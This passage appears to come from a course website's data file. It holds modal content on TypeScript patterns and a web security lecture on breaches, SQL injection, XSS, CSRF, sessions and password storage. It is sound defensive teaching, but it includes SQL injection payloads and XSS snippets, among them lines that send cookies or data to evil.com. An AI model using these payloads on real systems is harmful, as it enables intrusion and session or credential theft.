                title: 'noUncheckedIndexedAccess',
                body: `
                    <p>When enabled, accessing array elements or object properties by index includes <code>undefined</code> in the type.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Without noUncheckedIndexedAccess
const arr = [1, 2, 3];
const item = arr[10];  // type: number (but actually undefined!)
item.toFixed();  // Runtime error!

// With noUncheckedIndexedAccess
const arr = [1, 2, 3];
const item = arr[10];  // type: number | undefined
item.toFixed();
// Error: 'item' is possibly 'undefined'

// Forces safe access
const item = arr[10];
if (item !== undefined) {
    item.toFixed();  // Safe!
}

// Also works for objects
const config: Record<string, string> = { a: "1" };
const value = config["maybe"];  // type: string | undefined</code></pre>
                    </div>
                `
            },
            'pattern-api': {
                title: 'API Response Typing Pattern',
                body: `
                    <p>Use discriminated unions for type-safe API responses that handle both success and error cases.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Define the result type
type ApiResult<T> =
    | { success: true; data: T }
    | { success: false; error: string };

// API function returns this type
async function fetchUser(id: number): Promise<ApiResult<User>> {
    try {
        const res = await fetch(\`/api/users/\${id}\`);
        if (!res.ok) {
            return { success: false, error: \`HTTP \${res.status}\` };
        }
        const data = await res.json();
        return { success: true, data };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// Usage — TypeScript narrows the type
const result = await fetchUser(1);

if (result.success) {
    console.log(result.data.name);  // data is User
} else {
    console.error(result.error);    // error is string
}</code></pre>
                    </div>
                `
            },
            'pattern-builder': {
                title: 'Builder Pattern',
                body: `
                    <p>Use <code>this</code> return type for fluent, chainable APIs with proper typing.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>class QueryBuilder<T> {
    private filters: string[] = [];
    private ordering: string | null = null;
    private limitValue: number | null = null;

    where(column: keyof T, value: unknown): this {
        this.filters.push(\`\${String(column)} = ?\`);
        return this;  // Returns 'this' for chaining
    }

    orderBy(column: keyof T, dir: 'asc' | 'desc' = 'asc'): this {
        this.ordering = \`\${String(column)} \${dir}\`;
        return this;
    }

    limit(n: number): this {
        this.limitValue = n;
        return this;
    }

    async execute(): Promise<T[]> { /* ... */ }
}

// Fluent, type-safe usage
const users = await new QueryBuilder<User>()
    .where('status', 'active')
    .orderBy('createdAt', 'desc')
    .limit(10)
    .execute();</code></pre>
                    </div>
                `
            },
            'pattern-branded': {
                title: 'Branded Types Pattern',
                body: `
                    <p>Use branded types to prevent mixing up values that have the same underlying type.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Problem: easy to mix up IDs
function getUser(id: number) { }
function getPost(id: number) { }

const userId = 1;
const postId = 2;
getUser(postId);  // Compiles! But wrong semantically

// Solution: branded types
type UserId = number & { __brand: "UserId" };
type PostId = number & { __brand: "PostId" };

function createUserId(id: number): UserId {
    return id as UserId;
}

function getUser(id: UserId) { }
function getPost(id: PostId) { }

const userId = createUserId(1);
const postId = createPostId(2);

getUser(userId);  // OK
getUser(postId);  // Error! PostId is not assignable to UserId
getUser(1);       // Error! number is not assignable to UserId</code></pre>
                    </div>
                `
            },
            'pattern-exhaustive': {
                title: 'Exhaustive Switch Pattern',
                body: `
                    <p>Use <code>never</code> to ensure all cases are handled in a switch statement.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>type Status = "pending" | "approved" | "rejected";

function assertNever(x: never): never {
    throw new Error("Unexpected value: " + x);
}

function getStatusColor(status: Status): string {
    switch (status) {
        case "pending":
            return "yellow";
        case "approved":
            return "green";
        case "rejected":
            return "red";
        default:
            return assertNever(status);  // Ensures all cases handled
    }
}

// Later, if you add a new status...
type Status = "pending" | "approved" | "rejected" | "cancelled";

// TypeScript immediately errors:
// Argument of type 'string' is not assignable to parameter of type 'never'.
// (Because "cancelled" falls through to default)</code></pre>
                    </div>
                `
            },
            // ==================== WEB SECURITY LECTURE ====================
            // Famous Breaches
            'breach-equifax': {
                title: 'Equifax Breach (2017)',
                body: `
                    <p>One of the largest data breaches in history — <strong>147 million Americans</strong> affected.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">What Happened</div>
                        <ul>
                            <li>Unpatched Apache Struts vulnerability (CVE-2017-5638)</li>
                            <li>Patch available for 2 months before breach</li>
                            <li>Attackers had access for 76 days</li>
                            <li>Stolen: SSNs, birth dates, addresses, driver's licenses</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Consequences</div>
                        <ul>
                            <li>$700M settlement with FTC</li>
                            <li>CEO, CIO, CSO all resigned</li>
                            <li>Stock dropped 35%</li>
                            <li>Criminal charges for insider trading</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Lesson</div>
                        <p><strong>Patch your dependencies.</strong> The vulnerability was known and patchable.</p>
                    </div>
                `
            },
            'breach-yahoo': {
                title: 'Yahoo Breach (2013-2014)',
                body: `
                    <p>The largest data breach ever — <strong>3 billion accounts</strong> compromised.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">What Happened</div>
                        <ul>
                            <li>State-sponsored hackers (allegedly Russia)</li>
                            <li>Forged cookies allowed access without passwords</li>
                            <li>Breach not disclosed until 2016 (during Verizon acquisition)</li>
                            <li>Initially reported as 1B, later revised to ALL 3B accounts</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Consequences</div>
                        <ul>
                            <li>$350M reduction in Verizon acquisition price</li>
                            <li>$117.5M settlement for affected users</li>
                            <li>SEC $35M fine for late disclosure</li>
                        </ul>
                    </div>
                `
            },
            'breach-linkedin': {
                title: 'LinkedIn Breach (2012)',
                body: `
                    <p><strong>165 million passwords</strong> leaked due to weak hashing.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">What Happened</div>
                        <ul>
                            <li>SQL injection gave access to password database</li>
                            <li>Passwords stored with SHA-1 — <strong>no salt</strong></li>
                            <li>90% of passwords cracked within hours</li>
                            <li>Sold on dark web for $2,200</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Why Unsalted Hashes Fail</div>
                        <p>Same password = same hash. Attackers pre-compute hashes (rainbow tables) and crack millions instantly.</p>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Lesson</div>
                        <p>Use <strong>bcrypt or Argon2</strong> — they're designed for passwords with built-in salting.</p>
                    </div>
                `
            },
            'breach-sony': {
                title: 'Sony PSN Breach (2011)',
                body: `
                    <p><strong>77 million accounts</strong> stolen via SQL injection.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">What Happened</div>
                        <ul>
                            <li>Basic SQL injection attack on PlayStation Network</li>
                            <li>Personal data: names, addresses, emails, birth dates</li>
                            <li>Credit card data possibly exposed</li>
                            <li>PSN offline for 23 days</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Consequences</div>
                        <ul>
                            <li>$171M in costs</li>
                            <li>Class action lawsuits</li>
                            <li>Congressional hearings</li>
                            <li>Free games as apology to users</li>
                        </ul>
                    </div>
                `
            },
            // Attacker Vectors
            'vector-input': {
                title: 'User Input Reaching Database',
                body: `
                    <p>Attackers look for any input that gets processed by backend systems.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Attack Surfaces</div>
                        <ul>
                            <li>Search boxes → SQL injection</li>
                            <li>Login forms → authentication bypass</li>
                            <li>Comment fields → XSS, stored payloads</li>
                            <li>File uploads → malicious files</li>
                            <li>URL parameters → parameter tampering</li>
                            <li>HTTP headers → header injection</li>
                        </ul>
                    </div>
                `
            },
            'vector-auth': {
                title: 'Weak Authentication Flows',
                body: `
                    <p>Common authentication weaknesses attackers exploit.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Vulnerabilities</div>
                        <ul>
                            <li>No rate limiting → brute force attacks</li>
                            <li>Predictable session tokens → session hijacking</li>
                            <li>Password reset via email without verification</li>
                            <li>Remember me tokens that never expire</li>
                            <li>Missing MFA on sensitive operations</li>
                        </ul>
                    </div>
                `
            },
            'vector-access': {
                title: 'Direct Object References',
                body: `
                    <p>Predictable IDs in URLs that allow accessing other users' data.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Vulnerable patterns
/api/users/123/documents
/api/orders/1001
/download?file=report_123.pdf

// Attacker just increments:
/api/users/124/documents  // Someone else's!
/api/orders/1002          // Another order!</code></pre>
                    </div>
                `
            },
            'vector-exposed': {
                title: 'Exposed Configuration',
                body: `
                    <p>Sensitive files accidentally made public.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Commonly Exposed</div>
                        <ul>
                            <li><code>/.git/</code> — full source code</li>
                            <li><code>/.env</code> — environment variables, API keys</li>
                            <li><code>/config.php</code> — database credentials</li>
                            <li><code>/backup.sql</code> — database dumps</li>
                            <li><code>/phpinfo.php</code> — server configuration</li>
                            <li><code>/.aws/credentials</code> — AWS keys</li>
                        </ul>
                    </div>
                `
            },
            'vector-errors': {
                title: 'Verbose Error Messages',
                body: `
                    <p>Detailed errors reveal system internals to attackers.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Dangerous error exposed to user:
Error: ER_PARSE_ERROR: You have an error in your SQL
syntax; check the manual... near 'SELECT * FROM users
WHERE id = '' OR '1'='1'' at line 1

// This reveals:
// - Database type (MySQL)
// - Table name (users)
// - Column name (id)
// - Vulnerable to SQL injection</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Fix</div>
                        <p>Log detailed errors server-side. Show generic messages to users.</p>
                    </div>
                `
            },
            'vector-outdated': {
                title: 'Outdated Dependencies',
                body: `
                    <p>Known vulnerabilities in old library versions.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">The Problem</div>
                        <ul>
                            <li>Dependencies have security vulnerabilities</li>
                            <li>CVEs published with exploitation details</li>
                            <li>Attackers scan for known vulnerable versions</li>
                            <li>Automated tools exploit at scale</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Defense</div>
                        <ul>
                            <li><code>npm audit</code> — check for vulnerabilities</li>
                            <li>Dependabot / Renovate — automated updates</li>
                            <li>Regular dependency updates</li>
                        </ul>
                    </div>
                `
            },
            // SQL Injection Real Attacks
            'sqli-heartland': {
                title: 'Heartland Payment Systems (2008)',
                body: `
                    <p>The largest credit card breach in history at that time.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">The Attack</div>
                        <ul>
                            <li>SQL injection on company website</li>
                            <li>Installed malware on payment processing servers</li>
                            <li><strong>134 million credit cards</strong> stolen</li>
                            <li>Undetected for 6+ months</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">The Attacker</div>
                        <p>Albert Gonzalez — also behind TJX breach. Sentenced to 20 years in federal prison.</p>
                    </div>
                `
            },
            'sqli-sony': {
                title: 'Sony Pictures - LulzSec (2011)',
                body: `
                    <p>Hacker group LulzSec embarrassed Sony with basic SQL injection.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">The Attack</div>
                        <ul>
                            <li>"A very simple SQL injection" — LulzSec statement</li>
                            <li>1 million user accounts stolen</li>
                            <li>Passwords stored in <strong>plain text</strong></li>
                            <li>Published everything online</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">LulzSec Statement</div>
                        <p>"Sony stored over 1 million passwords of its customers in plain text... disgraceful and insecure."</p>
                    </div>
                `
            },
            'sqli-talktalk': {
                title: 'TalkTalk Breach (2015)',
                body: `
                    <p>A <strong>17-year-old</strong> breached a major UK telecom with basic SQLi.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">The Attack</div>
                        <ul>
                            <li>SQL injection on customer portal</li>
                            <li>157,000 customer records stolen</li>
                            <li>Bank details exposed</li>
                            <li>Used for fraud and identity theft</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Consequences</div>
                        <ul>
                            <li>£400,000 ICO fine</li>
                            <li>CEO Dido Harding resigned</li>
                            <li>100,000+ customers left</li>
                            <li>Stock dropped 10%</li>
                        </ul>
                    </div>
                `
            },
            // SQL Injection Techniques
            'sqli-union': {
                title: 'UNION-Based SQL Injection',
                body: `
                    <p>Extract data from other tables by appending a UNION SELECT.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- Original query
SELECT name, price FROM products WHERE id = 1

-- Attacker input: 1 UNION SELECT username, password FROM users--
SELECT name, price FROM products WHERE id = 1
UNION SELECT username, password FROM users--

-- Result shows product data AND user credentials!</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Requirements</div>
                        <ul>
                            <li>Same number of columns in both queries</li>
                            <li>Compatible data types</li>
                            <li>Attacker can see results</li>
                        </ul>
                    </div>
                `
            },
            'sqli-blind': {
                title: 'Blind SQL Injection',
                body: `
                    <p>Extract data one bit at a time based on true/false responses.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- Check if first char of password is 'a'
' AND SUBSTRING(password,1,1)='a'--
-- Page loads normally = TRUE
-- Error or different response = FALSE

-- Binary search through all characters
' AND ASCII(SUBSTRING(password,1,1))>64--  // Is it > 64?
' AND ASCII(SUBSTRING(password,1,1))>96--  // Is it > 96?

-- Eventually extract entire password character by character</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Why It Works</div>
                        <p>Even without seeing query results, different app behavior (error vs success) leaks information.</p>
                    </div>
                `
            },
            'sqli-time': {
                title: 'Time-Based Blind SQL Injection',
                body: `
                    <p>When there's no visible difference, use time delays to infer data.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- If condition is true, wait 5 seconds
' AND IF(1=1, SLEEP(5), 0)--

-- Check if admin user exists
' AND IF(EXISTS(SELECT * FROM users WHERE username='admin'), SLEEP(5), 0)--

-- If response takes 5 seconds = TRUE
-- If response is immediate = FALSE

-- Extract data by timing
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Defense</div>
                        <p>Parameterized queries prevent ALL types of SQL injection.</p>
                    </div>
                `
            },
            'sqli-second': {
                title: 'Second-Order SQL Injection',
                body: `
                    <p>Payload stored in database, executed later in different context.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- Step 1: Register with malicious username
Username: admin'--

-- Stored safely (parameterized insert)
INSERT INTO users (username) VALUES ('admin''--')

-- Step 2: Later, vulnerable code uses username
-- Password reset query (vulnerable!)
query = "UPDATE users SET password='newpass' WHERE username='" + user.username + "'"

-- Becomes:
UPDATE users SET password='newpass' WHERE username='admin'--'

-- Resets admin password!</code></pre>
                    </div>
                `
            },
            // Samy Worm
            'samy-worm': {
                title: 'The Samy Worm — Full Story',
                body: `
                    <p>The fastest spreading virus in history, written by a 19-year-old.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">The Exploit</div>
                        <ul>
                            <li>MySpace filtered &lt;script&gt; but not CSS expressions</li>
                            <li>Used JavaScript in CSS: <code>style="background:url('javascript:...')"</code></li>
                            <li>Bypassed innerHTML filtering with encoded characters</li>
                            <li>Self-replicated by modifying viewer's profile</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">The Spread</div>
                        <ul>
                            <li><strong>Hour 1:</strong> 1 friend infected</li>
                            <li><strong>Hour 8:</strong> 1,000+ infected</li>
                            <li><strong>Hour 18:</strong> 1,000,000+ infected</li>
                            <li>Each victim spread to all their friends</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Aftermath</div>
                        <p>Samy Kamkar was raided by Secret Service, sentenced to 3 years probation, banned from internet, 90 days community service.</p>
                    </div>
                `
            },
            // XSS Types
            'xss-stored-detail': {
                title: 'Stored XSS — Persistent Attack',
                body: `
                    <p>Malicious script permanently stored on target server.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Attacker posts comment:
"Great article! <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>"

// Stored in database, served to ALL visitors
// Every visitor's session stolen!</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Common Targets</div>
                        <ul>
                            <li>Comments and reviews</li>
                            <li>User profiles and bios</li>
                            <li>Forum posts</li>
                            <li>Support tickets</li>
                        </ul>
                    </div>
                `
            },
            'xss-reflected-detail': {
                title: 'Reflected XSS — URL-Based Attack',
                body: `
                    <p>Script in URL parameter reflected back in the response.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Vulnerable search page
https://shop.com/search?q=<script>alert('XSS')</script>

// Server renders:
<p>Search results for: <script>alert('XSS')</script></p>

// Attacker sends victim a link:
https://shop.com/search?q=<script>stealCookies()</script>

// Victim clicks, their browser executes the script</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Attack Vector</div>
                        <p>Requires victim to click malicious link. Often distributed via phishing emails.</p>
                    </div>
                `
            },
            'xss-dom-detail': {
                title: 'DOM-Based XSS — Client-Side Attack',
                body: `
                    <p>Vulnerability in client-side JavaScript, not server response.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Vulnerable JavaScript
const name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello, ' + name;

// URL: https://site.com/#<img src=x onerror=alert('XSS')>

// The script never reaches the server!
// All processing happens in the browser</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Dangerous Sinks</div>
                        <ul>
                            <li><code>innerHTML</code>, <code>outerHTML</code></li>
                            <li><code>document.write()</code></li>
                            <li><code>eval()</code>, <code>setTimeout(string)</code></li>
                            <li><code>location.href</code>, <code>location.assign()</code></li>
                        </ul>
                    </div>
                `
            },
            // CSP
            'csp-script': {
                title: 'CSP script-src Directive',
                body: `
                    <p>Controls which scripts can execute on your page.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Strict policy — blocks inline scripts!
script-src 'self';

// With trusted CDN
script-src 'self' https://cdn.jsdelivr.net;

// Allow inline with nonce (unique per request)
script-src 'self' 'nonce-abc123';
<script nonce="abc123">/* allowed */</script>
<script>/* blocked! */</script></code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Why This Kills XSS</div>
                        <p>Even if attacker injects <code>&lt;script&gt;evil()&lt;/script&gt;</code>, browser refuses to execute it without the correct nonce.</p>
                    </div>
                `
            },
            'csp-connect': {
                title: 'CSP connect-src Directive',
                body: `
                    <p>Controls where your page can send data (fetch, XHR, WebSocket).</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Only allow API calls to your domain
connect-src 'self' https://api.yoursite.com;

// XSS payload tries to send data to attacker:
fetch('https://evil.com/steal?data=' + secrets);

// Browser blocks it:
// Refused to connect to 'https://evil.com'
// because it violates CSP connect-src directive</code></pre>
                    </div>
                `
            },
            'csp-frame': {
                title: 'CSP frame-ancestors Directive',
                body: `
                    <p>Prevents your site from being embedded in iframes (clickjacking protection).</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Prevent embedding completely
frame-ancestors 'none';

// Only allow same origin
frame-ancestors 'self';

// Allow specific parent sites
frame-ancestors 'self' https://trusted-partner.com;</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Clickjacking Attack</div>
                        <p>Attacker overlays invisible iframe of your site over a fake page. User thinks they're clicking attacker's button, actually clicking yours.</p>
                    </div>
                `
            },
            // Password Storage
            'shame-plaintext': {
                title: 'Plain Text Passwords',
                body: `
                    <p>The worst possible security — passwords stored as-is.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">RockYou Breach (2009)</div>
                        <ul>
                            <li>32 million passwords in plain text</li>
                            <li>Database leaked via SQL injection</li>
                            <li>Became the standard password cracking wordlist</li>
                            <li>Still used by security researchers today</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Top Passwords Found</div>
                        <p>123456, 12345, 123456789, password, iloveyou, princess, rockyou</p>
                    </div>
                `
            },
            'shame-md5': {
                title: 'MD5 Hash (No Salt)',
                body: `
                    <p>Fast hash designed for integrity checking, not passwords.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Problems</div>
                        <ul>
                            <li><strong>Too fast</strong> — billions of hashes/second on GPU</li>
                            <li><strong>Rainbow tables</strong> — pre-computed hash lookups</li>
                            <li><strong>No salt</strong> — same password = same hash</li>
                            <li><strong>Collision attacks</strong> — cryptographically broken</li>
                        </ul>
                    </div>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Two users with same password
MD5("password123") = "482c811..."  // User 1
MD5("password123") = "482c811..."  // User 2 (same!)

// Attacker cracks one, gets both</code></pre>
                    </div>
                `
            },
            'shame-sha1': {
                title: 'SHA-1 Unsalted',
                body: `
                    <p>Slightly better than MD5, but still fundamentally broken for passwords.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Adobe Breach (2013)</div>
                        <ul>
                            <li>153 million accounts</li>
                            <li>Used 3DES encryption (reversible!) not hashing</li>
                            <li>Same password = same ciphertext</li>
                            <li>Password hints stored in plain text</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">The Crossword Puzzle</div>
                        <p>Security researchers created a crossword puzzle from Adobe password hints. Most common password hint: "123456" appeared 1.9 million times.</p>
                    </div>
                `
            },
            'shame-bcrypt': {
                title: 'bcrypt — The Right Way',
                body: `
                    <p>Password hashing algorithm designed to be slow and resistant to cracking.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// bcrypt hash includes:
// - Algorithm identifier ($2b$)
// - Cost factor (12 = 2^12 iterations)
// - Random salt (22 chars)
// - Hash (31 chars)

$2b$12$LQv3c1yqBWVHxkd0LHAkCO/YMDEgmUW1E7RzgNXCp.M3Kx2oKJ7v2</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Why bcrypt Works</div>
                        <ul>
                            <li><strong>Intentionally slow</strong> — ~100ms per hash</li>
                            <li><strong>Adjustable cost</strong> — increase as hardware gets faster</li>
                            <li><strong>Built-in salt</strong> — each password unique</li>
                            <li><strong>GPU-resistant</strong> — memory-hard algorithm</li>
                        </ul>
                    </div>
                `
            },
            // Session Attacks
            'session-hijack': {
                title: 'Session Hijacking',
                body: `
                    <p>Attacker steals session cookie and impersonates the user.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Attack Vectors</div>
                        <ul>
                            <li><strong>XSS</strong> — steal cookie via JavaScript</li>
                            <li><strong>Network sniffing</strong> — intercept on HTTP</li>
                            <li><strong>Malware</strong> — steal from browser storage</li>
                            <li><strong>Physical access</strong> — copy from browser</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Defenses</div>
                        <ul>
                            <li><code>HttpOnly</code> — blocks JavaScript access</li>
                            <li><code>Secure</code> — HTTPS only</li>
                            <li>Short expiration times</li>
                            <li>Bind session to IP/User-Agent</li>
                        </ul>
                    </div>
                `
            },
            'session-fixation': {
                title: 'Session Fixation',
                body: `
                    <p>Attacker sets the session ID before victim logs in.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>1. Attacker gets valid session: SESS=abc123
2. Attacker tricks victim into using it:
   <a href="https://bank.com/?SESS=abc123">Click here</a>
3. Victim clicks, logs in with SESS=abc123
4. Attacker uses SESS=abc123 — logged in as victim!</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Defense</div>
                        <p><strong>Regenerate session ID on login.</strong> Old session becomes invalid.</p>
                    </div>
                `
            },
            // CSRF
            'csrf-detail': {
                title: 'CSRF Attack Explained',
                body: `
                    <p>Force authenticated users to perform unwanted actions.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">How It Works</div>
                        <ol>
                            <li>User logs into bank.com</li>
                            <li>Session cookie stored in browser</li>
                            <li>User visits evil.com (in another tab)</li>
                            <li>evil.com makes request to bank.com</li>
                            <li>Browser automatically includes cookies!</li>
                            <li>Bank thinks it's a legitimate request</li>
                        </ol>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Real Example: Netflix (2006)</div>
                        <p>CSRF allowed attackers to add DVDs to victims' queues, change shipping addresses, and access account details.</p>
                    </div>
                `
            },
            'csrf-token': {
                title: 'CSRF Token Defense',
                body: `
                    <p>Include a secret token that attackers can't guess.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Server generates random token per session
const csrfToken = crypto.randomBytes(32).toString('hex');
session.csrfToken = csrfToken;

// Include in form
<form action="/transfer" method="POST">
    <input type="hidden" name="_csrf" value="{{csrfToken}}">
    <input name="amount" value="100">
    <button>Transfer</button>
</form>

// Server validates
if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
}</code></pre>
                    </div>
                `
            },
            'csrf-samesite': {
                title: 'SameSite Cookie Defense',
                body: `
                    <p>Browser doesn't send cookie on cross-site requests.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// SameSite=Strict — most secure
// Cookie never sent cross-site
Set-Cookie: session=abc; SameSite=Strict

// SameSite=Lax — allows GET navigations
// Cookie sent on links, not forms
Set-Cookie: session=abc; SameSite=Lax

// Modern browsers default to Lax</code></pre>
                    </div>
                `
            },
            'csrf-origin': {
                title: 'Origin Header Check',
                body: `
                    <p>Verify the request originated from your site.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>app.post('/api/*', (req, res, next) => {
    const origin = req.headers.origin;
    const referer = req.headers.referer;

    const allowed = ['https://mysite.com', 'https://www.mysite.com'];

    if (!allowed.includes(origin)) {
        return res.status(403).json({
            error: 'Invalid origin'
        });
    }
    next();
});</code></pre>
                    </div>
                `
            },
            // Privilege Escalation
            'priv-horizontal': {
                title: 'Horizontal Privilege Escalation',
                body: `
                    <p>Access other users' data at the same privilege level.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// User A views their profile
GET /api/users/100/settings

// User A changes ID to access User B
GET /api/users/101/settings  // User B's data!

// Common in:
// - Sequential integer IDs
// - Missing ownership checks
// - Predictable resource identifiers</code></pre>
                    </div>
                `
            },
            'priv-vertical': {
                title: 'Vertical Privilege Escalation',
                body: `
                    <p>Gain higher privileges than assigned.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Trusting client-provided role
POST /api/register
{ "name": "Hacker", "email": "...", "role": "admin" }

// Hidden admin endpoints
GET /admin/users  // No auth check!
POST /api/internal/deleteAll

// Manipulating JWT
{ "user": "attacker", "role": "admin" }
// If secret key is weak/leaked</code></pre>
                    </div>
                `
            },
            // Developer Mistakes
            'mistake-git': {
                title: 'Exposed .git Folder',
                body: `
                    <p>Entire source code and history downloadable from production server.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">What's Exposed</div>
                        <ul>
                            <li>All source code</li>
                            <li>Complete commit history</li>
                            <li>All branches (including "secret" ones)</li>
                            <li>Hardcoded secrets in old commits</li>
                            <li>Developer emails and names</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Prevention</div>
                        <ul>
                            <li>Block /.git in web server config</li>
                            <li>Don't deploy .git folder</li>
                            <li>Use CI/CD that excludes .git</li>
                        </ul>
                    </div>
                `
            },
            'mistake-env': {
                title: 'Committed .env File',
                body: `
                    <p>API keys and passwords pushed to version control.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">The Problem</div>
                        <ul>
                            <li>Once committed, in git history forever</li>
                            <li>Even after deletion, recoverable</li>
                            <li>Bots scan GitHub continuously for secrets</li>
                            <li>AWS keys found within minutes</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">If You Committed Secrets</div>
                        <ol>
                            <li>Rotate the credentials IMMEDIATELY</li>
                            <li>Use git-filter-branch to remove from history</li>
                            <li>Force push (coordinate with team)</li>
                            <li>Consider repository compromised</li>
                        </ol>
                    </div>
                `
            },
            'mistake-logs': {
                title: 'Secrets in Logs',
                body: `
                    <p>Sensitive data logged in plain text, often to third-party services.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// WRONG — logs password!
console.log('Login attempt:', req.body);
// { username: "alice", password: "secret123" }

// WRONG — logs token!
console.log('Request headers:', req.headers);
// { authorization: "Bearer eyJhbG..." }

// RIGHT — redact sensitive fields
const safeBody = { ...req.body, password: '[REDACTED]' };
console.log('Login attempt:', safeBody);</code></pre>
                    </div>
                `
            },
            'mistake-url': {
                title: 'Secrets in URLs',
                body: `
                    <p>Tokens in query strings get logged, shared, and leaked.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Where URLs Get Logged</div>
                        <ul>
                            <li>Browser history</li>
                            <li>Web server logs</li>
                            <li>Proxy servers</li>
                            <li>Referrer headers (sent to other sites!)</li>
                            <li>Analytics tools</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Fix</div>
                        <p>Use Authorization header instead of URL parameters for tokens.</p>
                    </div>
                `
            },
            'mistake-error': {
                title: 'Verbose Error Messages',
                body: `
                    <p>Detailed errors reveal system internals to attackers.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Production error page showing:
Error: ENOENT: no such file or directory
at /var/www/app/node_modules/express/lib/router.js:174
SQL Query: SELECT * FROM users WHERE id = '...'
Database: mysql://user:password@localhost:3306/prod

// Reveals:
// - Technology stack
// - File paths
// - SQL queries
// - Database credentials!</code></pre>
                    </div>
                `
            },
            'mistake-backup': {
                title: 'Exposed Backup Files',
                body: `
                    <p>Backup and temporary files accidentally served.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Commonly Found</div>
                        <ul>
                            <li><code>/backup.sql</code> — database dump</li>
                            <li><code>/config.php.bak</code> — config backup</li>
                            <li><code>/index.php~</code> — vim backup</li>
                            <li><code>/.DS_Store</code> — macOS directory info</li>
                            <li><code>/dump.rdb</code> — Redis dump</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Prevention</div>
